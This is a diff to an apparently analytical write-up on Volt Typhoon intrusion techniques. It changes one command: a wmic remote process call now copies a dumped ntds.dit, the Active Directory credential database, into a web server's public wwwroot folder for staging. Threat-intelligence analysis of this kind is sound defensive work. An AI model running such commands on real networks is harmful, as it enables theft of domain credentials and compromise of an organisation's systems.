@@ -82,7 +82,7 @@ This produced a copy of `ntds.dit` — the Active Directory database containing 
 The database was moved to the web server using `xcopy`:
 
 ```
-xcopy C:\Windows\Temp\tmp\* \\webserver-01\c$\inetpub\wwwroot\
+wmic /node:webserver-01 process call create "cmd.exe /c xcopy C:\Windows\Temp\tmp\temp.dit \\webserver-01\c$\inetpub\wwwroot"
 ```
 ![Data Staging & Archiving](../images/Volt-Typhoon5.png)
 
